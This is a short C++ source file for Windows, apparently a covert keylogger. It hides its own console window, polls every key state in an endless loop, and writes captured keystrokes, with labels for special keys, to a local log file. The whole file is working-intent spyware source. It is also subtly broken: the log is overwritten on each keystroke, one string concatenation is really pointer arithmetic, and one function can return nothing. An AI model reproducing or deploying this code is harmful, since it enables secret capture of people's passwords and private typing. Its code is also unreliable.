#include<iostream>
#include<fstream>
#include<Windows.h>

using namespace std;

// Path of log
#define LOG_PATH "keylog.txt"

// Save data
void saveData(string data) {
	ofstream log(LOG_PATH);
	log << data;
	log.close();
}

// Translate special keys
string translateKey(int key) {
	switch (key)
	{
	case VK_SPACE:
		// Space
		return "[SPACE] ";
	case VK_CAPITAL:
		// Capslock
		return "[CAPSLOCK] ";
	case VK_ESCAPE:
		// Escape
		return "[ESC] ";
	case VK_TAB:
		// Tab
		return "[TAB] ";
	case VK_SHIFT:
		// Shift
		return "[SHIFT] ";
	case VK_CONTROL:
		// Control
		return "[CTRL] ";
	case VK_MENU:
		// Alt
		return "[ALT] ";
	case VK_BACK:
		// Backspace
		return "[BACKSPACE] ";
	case VK_RETURN:
		// Enter
		return "[ENTER]\n";
	case VK_UP:
		// Up arrow
		return "[UP] ";
	case VK_DOWN:
		// Down arrow
		return "[DOWN] ";
	case VK_LEFT:
		// Left arrow
		return "[LEFT] ";
	case VK_RIGHT:
		// Right arrow
		return "[RIGHT] ";
	// 12 function key
	case VK_F1:
		return "[F1] ";
	case VK_F2:
		return "[F2] ";
	case VK_F3:
		return "[F3] ";
	case VK_F4:
		return "[F4] ";
	case VK_F5:
		return "[F5] ";
	case VK_F6:
		return "[F6] ";
	case VK_F7:
		return "[F7] ";
	case VK_F8:
		return "[F8] ";
	case VK_F9:
		return "[F9] ";
	case VK_F10:
		return "[F10] ";
	case VK_F11:
		return "[F11] ";
	case VK_F12:
		return "[F12] ";
	default:
		break;
	}
}

// Main function
int main() {
	int specialKeyArray[25] = { VK_SPACE, VK_CAPITAL, VK_ESCAPE, VK_TAB, VK_SHIFT, VK_CONTROL, VK_MENU, VK_BACK, VK_RETURN, VK_UP, VK_DOWN, VK_RIGHT, VK_LEFT, VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12 };
	// Hide window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	while (true) {
		for (int key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				bool isSpecial = find(begin(specialKeyArray), end(specialKeyArray), key) != end(specialKeyArray);
				if (isSpecial) {
					saveData(translateKey(key));
				}
				else {
					string data = (char)key + " ";
					saveData(data);
				}
			}
		}
	}
}
